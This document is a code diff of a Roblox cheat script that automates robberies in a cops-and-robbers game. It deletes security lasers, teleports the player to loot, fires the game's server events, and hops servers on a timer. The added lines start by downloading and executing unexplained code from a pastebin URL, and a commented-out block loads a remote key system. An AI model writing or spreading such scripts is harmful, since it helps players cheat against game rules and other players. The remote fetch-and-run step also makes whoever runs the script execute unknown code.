@@ -1,164 +1,153 @@
--- Wait until the game is fully loaded
-task.wait()
+repeat task.wait() until game:IsLoaded()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Dffn96Gz"))()
 
 local TweenService = game:GetService("TweenService")
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-local RunService = game:GetService("RunService")
-local PlayerService = game:GetService("Players")
-local Player = PlayerService.LocalPlayer
 
-local flyspeed = getgenv().FlySpeed or 50
-local minPlayers = getgenv().ServerHop and getgenv().ServerHop.min or 5
-local maxPlayers = getgenv().ServerHop and getgenv().ServerHop.max or 25
-local teleportRetries = 3 -- Retry teleportation 3 times if it fails
+--prepare the script
+local flyspeed = getgenv().FlySpeed
 
--- Robbery items to look for
-local MiniRobberies = {"Cash", "CashRegister", "DiamondBox", "Laptop", "Phone", "Luggage", "ATM", "TV", "Safe"}
+function shop(min, max)
+    local goofyahhvalue = math.random(min, max)
+    local Player = game.Players.LocalPlayer    
+    local Http = game:GetService("HttpService")
+    local TPS = game:GetService("TeleportService")
+    local Api = "https://games.roblox.com/v1/games/"
 
--- Tween settings for smooth movement
-local tweenSpeed = 50  -- Adjust speed (higher is faster)
-local tweenStyle = Enum.EasingStyle.Linear
-local tweenDirection = Enum.EasingDirection.InOut
+    local _place,_id = game.PlaceId, game.JobId
+    local _servers = Api.._place.."/servers/Public?sortOrder=Desc&limit=100"
+    function ListServers(cursor)
+        local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
+        return Http:JSONDecode(Raw)
+    end
 
--- Function to create ESP for a target
-local function createESP(object, color)
-    -- Create ESP UI objects
-    local Billboard = Instance.new("BillboardGui")
-    local Frame = Instance.new("Frame")
-
-    -- BillboardGui settings
-    Billboard.Name = "ESP"
-    Billboard.Adornee = object
-    Billboard.AlwaysOnTop = true
-    Billboard.Size = UDim2.new(0, 200, 0, 50)
-    Billboard.StudsOffset = Vector3.new(0, 2, 0)
-
-    -- Frame settings
-    Frame.Size = UDim2.new(1, 0, 1, 0)
-    Frame.BackgroundTransparency = 0.5
-    Frame.BackgroundColor3 = color
-    Frame.BorderSizePixel = 0
-
-    -- Parent UI elements
-    Frame.Parent = Billboard
-    Billboard.Parent = object
-end
-
--- Function to add ESP to all players
-local function addPlayerESP()
-    for _, v in pairs(PlayerService:GetPlayers()) do
-        if v ~= Player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
-            createESP(v.Character.HumanoidRootPart, Color3.fromRGB(255, 0, 0))  -- Red for players
+    local Next; repeat
+        task.wait()
+        local Servers = ListServers(Next)
+        for i,v in next, Servers.data do
+            if v.playing < goofyahhvalue and v.id ~= _id then
+                local s,r = pcall(TPS.TeleportToPlaceInstance,TPS,_place,v.id,Player)
+                if s then task.wait(5) break end
+            end
         end
+        Next = Servers.nextPageCursor
+    until not Next
+end
+
+getgenv().shop = shop
+
+workspace:WaitForChild("Ignore")
+workspace:WaitForChild("ComputerStore"):WaitForChild("Lasers"):Destroy()
+workspace:WaitForChild("JewelryStore"):WaitForChild("Jewlery"):WaitForChild("Lasers"):Destroy()
+task.wait(0.5)
+for i, v in next, workspace.Ignore.WorldObjects:GetChildren() do
+    if v.Name == "Lasers" then
+        v:Destroy()
     end
 end
 
--- Function to add ESP to robbery objects
-local function addRobberyESP()
-    for _, object in pairs(workspace.ObjectSelection:GetChildren()) do
-        if table.find(MiniRobberies, object.Name) and object:IsDescendantOf(workspace) then
-            createESP(object, Color3.fromRGB(0, 255, 0))  -- Green for robbery targets
-        end
-    end
-end
+game:GetService("ReplicatedStorage"):WaitForChild("RemoteFunction"):InvokeServer("SetTeam", getgenv().Team)
 
--- Function to move player to a target smoothly using TweenService
-local function moveToTarget(targetPosition)
-    if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
-        local humanoidRootPart = Player.Character.HumanoidRootPart
-        
-        -- Create tween info
-        local tweenInfo = TweenInfo.new(
-            (targetPosition - humanoidRootPart.Position).Magnitude / tweenSpeed, -- Time based on distance
-            tweenStyle,
-            tweenDirection
-        )
-
-        -- Create the tween to move to target
-        local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
-        tween:Play()
-        tween.Completed:Wait()  -- Wait for the movement to finish
-    end
-end
-
--- Faster robbing logic
-local function fastRob(object)
-    if object and object:IsDescendantOf(workspace) then
-        moveToTarget(object.Position)  -- Move to object smoothly
-        task.wait(0.5)  -- Short wait to simulate the interaction time (reduce this to make faster)
-        
-        -- Assume we "collect" the object (you can add more logic here)
-        if object:FindFirstChild("Destroy") then
-            object:Destroy()  -- Destroy the object after robbing (simulating a successful robbery)
-        end
-    end
-end
-
--- Function to add ESP and rob all robbery objects
-local function addRobberyESPAndRob()
-    for _, object in pairs(workspace.ObjectSelection:GetChildren()) do
-        if table.find(MiniRobberies, object.Name) and object:IsDescendantOf(workspace) then
-            createESP(object, Color3.fromRGB(0, 255, 0))  -- Green for robbery targets
-            fastRob(object)  -- Rob the object faster
-        end
-    end
-end
-
--- Run ESP updates and robbing continuously
-local function updateESPAndRobbing()
-    -- Remove old ESPs
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("BillboardGui") and v.Name == "ESP" then
-            v:Destroy()
-        end
-    end
-
-    -- Add ESPs and perform robbing
-    addPlayerESP()
-    addRobberyESPAndRob()
-end
-
--- Connect the update function to every frame
-RunService.RenderStepped:Connect(function()
-    updateESPAndRobbing()
+task.spawn(function()
+    task.wait(40)
+    shop(getgenv().ServerHop.min, getgenv().ServerHop.max)
 end)
 
--- Godmode function (unchanged from earlier)
-local function enableGodmode()
-    if Player.Character and Player.Character:FindFirstChild("Humanoid") then
-        local humanoid = Player.Character.Humanoid
+task.wait(getgenv().TimeToLoad)
+
+--[[local KeySystemUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/MaGiXxScripter0/keysystemv2api/master/ui/xrer_mstudio45.lua"))()
+KeySystemUI.New({
+    ApplicationName = "BlueLobster", -- Your Key System Application Name
+    Name = "Mad Lads v8", -- Your Script name
+    Info = "Get Key For Mad Lads v8", -- Info text in the GUI, keep empty for default text.
+    DiscordInvite = "https://discord.gg/cWqTmQDwDJ", -- Optional.
+    AuthType = "clientid" -- Can select verifycation with ClientId or IP ("clientid" or "ip")
+})
+repeat task.wait() until KeySystemUI.Finished() or KeySystemUI.Closed
+if KeySystemUI.Finished() and KeySystemUI.Closed == false then
+else
+    game:ShutDown()
+end]]--
+--prepare the script
+
+local char = workspace:WaitForChild(game:GetService("Players").LocalPlayer.Name)
+local hrp = char:WaitForChild("HumanoidRootPart")
+
+function tweenTp(x, y, z, speed)
+    local pos = Vector3.new(x, y, z)
+    
+    local distance = (hrp.Position - pos).Magnitude
+    
+    local info = TweenInfo.new(distance / speed) -- how long the tween will play for
+    
+    local Animation = TweenService:Create(hrp, info, {Position = pos})
+    Animation:Play()
+end
+
+local MiniRobberies = {
+    "Cash",
+    "CashRegister",
+    "DiamondBox",
+    "Laptop",
+    "Phone",
+    "Luggage",
+    "ATM",
+    "TV",
+    "Safe"
+}
+
+local function get_closest_small_robbery()
+    local closest_robbery = {}
+    for i, v in next, workspace.ObjectSelection:GetChildren() do
+        if not table.find(MiniRobberies, v.Name) then continue end
+        if v:FindFirstChild("Nope") then continue end
         
-        -- Max out health
-        humanoid.MaxHealth = 100
-        humanoid.Health = humanoid.MaxHealth
+        local function get_model_pos(model)
+            return model:GetPivot().Position
+        end
         
-        -- Override TakeDamage to prevent health reduction
-        humanoid.TakeDamage = function() end
-        
-        -- Regularly ensure health is full
-        RunService.RenderStepped:Connect(function()
-            if humanoid.Health < humanoid.MaxHealth then
-                humanoid.Health = humanoid.MaxHealth
-            end
-        end)
-        
-        -- Optional: Prevent fall damage
-        humanoid.StateChanged:Connect(function(_, newState)
-            if newState == Enum.HumanoidStateType.Freefall then
-                humanoid:ChangeState(Enum.HumanoidStateType.PlatformStanding)
-            end
-        end)
+        if #closest_robbery == 0 then --nothing in table so put the first thing
+            closest_robbery[1] = v
+            closest_robbery[2] = get_model_pos(v)
+            closest_robbery[3] = (get_model_pos(v) - hrp.Position).Magnitude
+        elseif (get_model_pos(v) - hrp.Position).Magnitude < (closest_robbery[2] - hrp.Position).Magnitude then
+            closest_robbery[1] = v
+            closest_robbery[2] = get_model_pos(v)
+            closest_robbery[3] = (get_model_pos(v) - hrp.Position).Magnitude
+        end
+    end
+    return closest_robbery
+end
+
+local function get_event(v)
+    for i, v in next, v:GetDescendants() do
+        if not v:IsA("RemoteEvent") then continue end
+        return v
     end
 end
 
--- Enable godmode on character spawn
-Player.CharacterAdded:Connect(function(character)
-    task.wait(1)  -- Small wait to ensure character is fully loaded
-    enableGodmode()
-end)
+repeat
+    local closest_robbery = get_closest_small_robbery()
+    
+    if closest_robbery[1] ~= nil then
+        local closest_robbery_pos = closest_robbery[2]
+        local evento = get_event(closest_robbery[1])
+        tweenTp(closest_robbery_pos.x, closest_robbery_pos.y, closest_robbery_pos.z, flyspeed)
+        if evento ~= nil and evento.Parent ~= nil then
+            evento:FireServer()
+        end
+    end
+    task.wait(0.05)
+until closest_robbery[1] == nil
 
--- Call godmode if character is already loaded
-if Player.Character then
-    enableGodmode()
-end
+task.wait(0.2)
+
+shop(getgenv().ServerHop.min, getgenv().ServerHop.max)
+
+-- Server hopper modified to hop every 30 seconds
+task.spawn(function()
+    while true do  -- Create an infinite loop to hop servers every 30 seconds
+        task.wait(30)  -- Wait for 30 seconds
+        shop(getgenv().ServerHop.min, getgenv().ServerHop.max)  -- Call the server hop function
+    end
+end)
